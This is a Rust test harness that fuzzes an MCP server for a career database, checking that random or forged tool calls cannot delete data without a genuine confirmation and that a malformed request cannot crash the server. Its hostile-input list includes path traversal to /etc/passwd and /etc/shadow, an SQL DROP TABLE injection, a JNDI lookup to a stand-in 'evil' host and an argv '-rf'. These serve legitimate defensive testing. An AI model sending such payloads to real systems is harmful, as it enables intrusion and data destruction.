//! Adversarial stress harness for the MCP surface.
//!
//! The per-defect regressions in `tests.rs` prove that each *known* attack is
//! blocked. This file asserts the properties those fixes exist to protect,
//! against randomly generated traffic — so a future change that reopens a hole
//! by a route nobody thought of still fails.
//!
//! Determinism matters more than entropy here: a seeded LCG means a failure is
//! reproducible from the seed printed in the assertion, and adding the `rand`
//! crate for a test harness would be a dependency the project does not need.
//!
//! The central property is [`the_knowledgebase_cannot_be_destroyed_without_a_genuine_confirmation`]:
//! whatever sequence of tool calls a client makes, seeded blocks survive unless
//! the client completed a real server-issued confirmation round trip.

use super::elicitation::ElicitationStore;
use super::protocol::JsonRpcRequest;
use super::server::StatelessMcpServer;
use super::tasks::TaskManager;
use crate::career_db::{Bullet, CareerDbState, DateRange, ExperienceBlock, SkillTag};
use serde_json::{json, Value};

/// Deterministic PRNG. Numerical Recipes LCG constants.
pub(crate) struct Lcg(u64);

impl Lcg {
    pub(crate) fn new(seed: u64) -> Self {
        // Avoid a zero state, which would make the sequence degenerate.
        Self(seed.wrapping_mul(6364136223846793005).wrapping_add(1))
    }

    pub(crate) fn next_u64(&mut self) -> u64 {
        self.0 = self
            .0
            .wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
        self.0 >> 11
    }

    pub(crate) fn below(&mut self, n: usize) -> usize {
        if n == 0 {
            0
        } else {
            (self.next_u64() % n as u64) as usize
        }
    }

    pub(crate) fn pick<'a, T>(&mut self, items: &'a [T]) -> &'a T {
        &items[self.below(items.len())]
    }

    pub(crate) fn bool(&mut self) -> bool {
        self.next_u64() % 2 == 0
    }
}

/// Strings chosen to break naive parsing, slicing, and escaping.
pub(crate) const HOSTILE_STRINGS: &[&str] = &[
    "",
    " ",
    "\0",
    "\u{feff}",                    // zero-width no-break space
    "\u{202e}gnirts desrever",     // RTL override
    "עברית ואנגלית mixed",         // bidi
    "🙂🙃👨‍👩‍👧‍👦",              // multi-codepoint grapheme clusters
    "e\u{0301}\u{0301}\u{0301}",   // stacked combining marks
    "../../../../etc/passwd",
    "'; DROP TABLE blocks; --",
    "%_\\",                        // SQL LIKE metacharacters
    "#let x = 1",                  // Typst code mode
    "${jndi:ldap://evil}",
    "{\"nested\":\"json\"}",
    "-rf",                         // leading dash: argv injection shape
    "file:///etc/shadow",
    "mcp://ingest/../escape",
    "fixture-block",               // a real id, to make collisions likely
];

pub(crate) fn hostile_string(rng: &mut Lcg) -> String {
    let base = rng.pick(HOSTILE_STRINGS).to_string();
    match rng.below(4) {
        0 => base,
        1 => base.repeat(1 + rng.below(3)),
        2 => format!("{base}{}", rng.next_u64()),
        _ => base.to_uppercase(),
    }
}

/// Arbitrary JSON, depth-bounded so generation terminates.
fn hostile_json(rng: &mut Lcg, depth: usize) -> Value {
    if depth == 0 {
        return match rng.below(5) {
            0 => Value::Null,
            1 => json!(rng.bool()),
            2 => json!(rng.next_u64()),
            3 => json!(-(rng.below(1000) as i64)),
            _ => Value::String(hostile_string(rng)),
        };
    }
    match rng.below(8) {
        0 => Value::Null,
        1 => json!(rng.bool()),
        2 => json!(rng.next_u64()),
        3 => json!(f64::from_bits(rng.next_u64())), // may be NaN/inf → serializes as null
        4 => Value::String(hostile_string(rng)),
        5 => {
            let n = rng.below(4);
            Value::Array((0..n).map(|_| hostile_json(rng, depth - 1)).collect())
        }
        _ => {
            let n = rng.below(5);
            let keys = [
                "query",
                "limit",
                "block_id",
                "block",
                "text",
                "title",
                "uri",
                "persona_id",
                "domain",
                "owner_kinds",
                "facts",
                "persona",
                "request_state",
                "input_responses",
                "source_type",
                "async",
            ];
            let mut obj = serde_json::Map::new();
            for _ in 0..n {
                obj.insert(rng.pick(&keys).to_string(), hostile_json(rng, depth - 1));
            }
            Value::Object(obj)
        }
    }
}

fn seeded_block(id: &str) -> ExperienceBlock {
    ExperienceBlock {
        id: id.to_string(),
        kind: "work".to_string(),
        title: "Senior Systems Engineer".to_string(),
        org: "Fixture Corp".to_string(),
        date_range: DateRange {
            start: "2022-01".to_string(),
            end: None,
        },
        personas: vec!["ai".to_string()],
        domains: vec!["developer tools".to_string()],
        skills: vec![SkillTag {
            name: "Rust".to_string(),
            level: 5,
            years: Some(6.0),
        }],
        seniority_level: "senior".to_string(),
        location: None,
        url: None,
        url_label: None,
        extra: None,
        bullets: vec![Bullet {
            id: format!("{id}-bullet"),
            canonical: "Built a Rust service, cutting cold start by 40%".to_string(),
            variants: serde_json::Map::new(),
            metrics: vec![crate::career_db::BulletMetric {
                value: "40%".to_string(),
                kind: "percent".to_string(),
            }],
            evidence_refs: Vec::new(),
            locked: false,
        }],
        facts: Vec::new(),
        notes: None,
        embedding_text: None,
        updated_at: "2026-01-01".to_string(),
    }
}

const SEEDED_IDS: &[&str] = &["block-a", "block-b", "block-c"];

fn stress_server() -> StatelessMcpServer {
    let db = CareerDbState::open_in_memory().expect("in-memory career db");
    db.with_conn(|conn| {
        for id in SEEDED_IDS {
            crate::career_db::upsert_block_blocking(conn, &seeded_block(id))?;
        }
        Ok(())
    })
    .expect("seed blocks");
    StatelessMcpServer::new(db)
}

async fn surviving_ids(server: &StatelessMcpServer) -> Vec<String> {
    let req = JsonRpcRequest::new(
        Some(json!(0)),
        "tools/call",
        Some(json!({ "name": "career_get_profile", "arguments": {} })),
    );
    let res = server.handle_request(None, req).await;
    res.result
        .and_then(|v| v["blocks"].as_array().cloned())
        .map(|blocks| {
            blocks
                .iter()
                .filter_map(|b| b["id"].as_str().map(str::to_string))
                .collect()
        })
        .unwrap_or_default()
}

async fn call(server: &StatelessMcpServer, tool: &str, args: Value) -> super::protocol::JsonRpcResponse {
    let req = JsonRpcRequest::new(
        Some(json!("stress")),
        "tools/call",
        Some(json!({ "name": tool, "arguments": args })),
    );
    server.handle_request(None, req).await
}

/// THE invariant. Every destructive tool, driven with randomly generated and
/// deliberately forged arguments, must leave the seeded blocks intact — because
/// none of these sequences completes a genuine confirmation round trip.
#[tokio::test]
async fn the_knowledgebase_cannot_be_destroyed_without_a_genuine_confirmation() {
    let server = stress_server();
    let tools: Vec<String> = server
        .list_all_tools()
        .into_iter()
        .map(|t| t.name)
        .filter(|n| n.starts_with("career_"))
        .collect();

    // Plausible forgeries: valid base64 of JSON that looks like real state.
    let forged_states = [
        "e30=",                                                     // {}
        "eyJibG9ja0lkIjoiYmxvY2stYSJ9",                             // {"blockId":"block-a"}
        "eyJfX25vbmNlIjoiMDAwMDAwMDAtMDAwMC00MDAwLTgwMDAtMDAwMDAwMDAwMDAwIn0=", // {"__nonce":"0000...-0000"}
        "eyJ0b29sIjoiY2FyZWVyX2RlbGV0ZV9ibG9jayIsImJsb2NrSWQiOiJibG9jay1hIn0=", // {"tool":...,"blockId":...}
        "!!!not base64!!!",
        "",
    ];

    for seed in 0..400u64 {
        let mut rng = Lcg::new(seed);
        let tool = rng.pick(&tools).clone();

        let mut args = hostile_json(&mut rng, 2);
        if !args.is_object() {
            args = json!({});
        }
        if let Some(obj) = args.as_object_mut() {
            // Bias hard toward the destructive shapes: a purely random object
            // rarely names a real block, and the point is to attack the gate.
            if rng.bool() {
                obj.insert(
                    "block_id".to_string(),
                    json!(rng.pick(SEEDED_IDS).to_string()),
                );
            }
            if rng.bool() {
                obj.insert(
                    "request_state".to_string(),
                    json!(rng.pick(&forged_states).to_string()),
                );
            }
            if rng.bool() {
                obj.insert("input_responses".to_string(), json!({ "confirm": true }));
            }
            if rng.bool() {
                // An emptied block: the overwrite-as-delete shape.
                let mut gutted = seeded_block(rng.pick(SEEDED_IDS));
                gutted.bullets.clear();
                obj.insert(
                    "block".to_string(),
                    serde_json::to_value(gutted).unwrap_or(Value::Null),
                );
            }
        }

        // A panic here fails the test; that is deliberate.
        let _ = call(&server, &tool, args).await;

        let alive = surviving_ids(&server).await;
        for id in SEEDED_IDS {
            assert!(
                alive.iter().any(|a| a == id),
                "seed {seed}: tool '{tool}' destroyed block '{id}' without a genuine confirmation; survivors: {alive:?}"
            );
        }
    }
}

/// The gate must not be so strict that the legitimate flow stops working.
/// A property that only ever says "no" is trivially satisfied by a broken tool.
#[tokio::test]
async fn the_genuine_confirmation_round_trip_still_works() {
    let server = stress_server();

    let elicit = call(&server, "career_delete_block", json!({ "block_id": "block-a" }))
        .await
        .result
        .expect("elicitation");
    assert_eq!(elicit["resultType"], "inputRequired");
    let state = elicit["requestState"].as_str().expect("requestState");

    let done = call(
        &server,
        "career_delete_block",
        json!({
            "block_id": "block-a",
            "input_responses": { "confirm": true },
            "request_state": state
        }),
    )
    .await;
    assert!(done.error.is_none(), "genuine flow failed: {:?}", done.error);

    let alive = surviving_ids(&server).await;
    assert!(
        !alive.iter().any(|a| a == "block-a"),
        "a confirmed deletion must actually delete"
    );
    assert!(
        alive.iter().any(|a| a == "block-b"),
        "and must not touch anything else"
    );
}

/// No tool call, however malformed, may panic the dispatcher or produce a
/// malformed JSON-RPC response.
#[tokio::test]
async fn the_dispatcher_survives_arbitrary_arguments() {
    let server = stress_server();
    let tools: Vec<String> = server.list_all_tools().into_iter().map(|t| t.name).collect();

    for seed in 0..600u64 {
        let mut rng = Lcg::new(seed ^ 0xA5A5_A5A5);
        let tool = rng.pick(&tools).clone();
        let args = hostile_json(&mut rng, 3);

        let res = call(&server, &tool, args.clone()).await;

        assert_eq!(res.jsonrpc, "2.0", "seed {seed}: bad envelope for '{tool}'");
        assert!(
            res.result.is_some() != res.error.is_some(),
            "seed {seed}: '{tool}' returned both or neither result and error"
        );
        if let Some(err) = res.error {
            assert!(
                !err.message.is_empty(),
                "seed {seed}: '{tool}' returned an empty error message for args {args}"
            );
        }
    }
}

/// Arbitrary JSON-RPC envelopes, not just arbitrary tool arguments.
#[tokio::test]
async fn the_router_survives_arbitrary_methods_and_params() {
    let server = stress_server();
    let methods = [
        "tools/list",
        "tools/call",
        "resources/list",
        "resources/read",
        "prompts/list",
        "prompts/get",
        "tasks/get",
        "tasks/cancel",
        "tasks/list",
        "notifications/initialized",
        "",
        "../../etc/passwd",
        "tools/call\0",
        "TOOLS/CALL",
    ];

    for seed in 0..400u64 {
        let mut rng = Lcg::new(seed ^ 0x5EED);
        let method = rng.pick(&methods).to_string();
        let params = if rng.bool() {
            Some(hostile_json(&mut rng, 3))
        } else {
            None
        };
        let id = match rng.below(4) {
            0 => None,
            1 => Some(json!(rng.next_u64())),
            2 => Some(Value::Null),
            _ => Some(json!(hostile_string(&mut rng))),
        };

        let res = server
            .handle_request(None, JsonRpcRequest::new(id.clone(), &method, params))
            .await;

        assert_eq!(res.jsonrpc, "2.0", "seed {seed}: bad envelope for '{method}'");
        assert_eq!(
            res.id, id,
            "seed {seed}: the response must echo the request id"
        );
    }
}

/// The nonce store must never accept a token it did not issue, and never accept
/// one twice, under randomized interleaving.
#[test]
fn the_elicitation_store_only_ever_honours_its_own_live_tokens() {
    let store = ElicitationStore::new();
    let subjects = ["a", "b", "c", "d"];
    let mut issued: Vec<(String, String)> = Vec::new();

    for seed in 0..2_000u64 {
        let mut rng = Lcg::new(seed ^ 0xBEEF);
        match rng.below(3) {
            // Issue
            0 => {
                let subject = rng.pick(&subjects).to_string();
                let nonce = store.issue("career_delete_block", &subject);
                issued.push((nonce, subject));
            }
            // Redeem something genuine
            1 if !issued.is_empty() => {
                let idx = rng.below(issued.len());
                let (nonce, subject) = issued.remove(idx);
                // First redemption may succeed; a second must not.
                let _ = store.consume(&nonce, "career_delete_block", &subject);
                assert!(
                    store
                        .consume(&nonce, "career_delete_block", &subject)
                        .is_err(),
                    "seed {seed}: a token was honoured twice"
                );
            }
            // Attack
            _ => {
                let forged = hostile_string(&mut rng);
                assert!(
                    store
                        .consume(&forged, "career_delete_block", rng.pick(&subjects))
                        .is_err(),
                    "seed {seed}: forged token '{forged}' was accepted"
                );
                // A genuine token used on the wrong subject must also fail.
                if let Some((nonce, subject)) = issued.first() {
                    let wrong = subjects
                        .iter()
                        .find(|s| *s != subject)
                        .copied()
                        .unwrap_or("z");
                    assert!(
                        store.consume(nonce, "career_delete_block", wrong).is_err(),
                        "seed {seed}: a token crossed subjects"
                    );
                    issued.remove(0);
                }
            }
        }
        assert!(
            store.pending_count() <= 256,
            "seed {seed}: the pending table grew past its cap"
        );
    }
}

/// Randomized task lifecycles must leave the manager bounded and consistent.
#[test]
fn the_task_manager_stays_bounded_and_consistent() {
    let mgr = TaskManager::new();
    let mut live: Vec<String> = Vec::new();

    for seed in 0..3_000u64 {
        let mut rng = Lcg::new(seed ^ 0xC0FFEE);
        match rng.below(5) {
            0 => {
                let h = mgr.create_task("stress", Some(rng.below(2) as u64));
                live.push(h.task_id);
            }
            1 if !live.is_empty() => {
                let id = live.remove(rng.below(live.len()));
                mgr.complete_task(&id, json!({ "seed": seed }));
            }
            2 if !live.is_empty() => {
                let id = live.remove(rng.below(live.len()));
                mgr.fail_task(&id, "stress failure".to_string());
            }
            3 if !live.is_empty() => {
                let id = live.remove(rng.below(live.len()));
                mgr.cancel_task(&id);
            }
            _ => {
                let tasks = mgr.list_tasks();
                // A terminal task must never revert, and progress stays in range.
                for t in &tasks {
                    assert!(
                        (0.0..=1.0).contains(&t.progress),
                        "seed {seed}: progress {} out of range",
                        t.progress
                    );
                }
            }
        }

        assert!(
            mgr.task_count() <= 512 + 64,
            "seed {seed}: task table grew to {} records",
            mgr.task_count()
        );
    }
}

/// A completed task's result must never be silently lost, whatever else is
/// happening to the table around it.
#[test]
fn a_completed_result_is_never_silently_dropped() {
    let mgr = TaskManager::new();
    for seed in 0..500u64 {
        let mut rng = Lcg::new(seed);
        let h = mgr.create_task("payload", Some(600));
        let payload = json!({ "seed": seed, "noise": hostile_string(&mut rng) });
        mgr.complete_task(&h.task_id, payload.clone());

        let got = mgr
            .get_task(&h.task_id)
            .unwrap_or_else(|| panic!("seed {seed}: completed task vanished"));
        assert_eq!(
            got.result,
            Some(payload),
            "seed {seed}: the recorded result differs from what was stored"
        );
    }
}
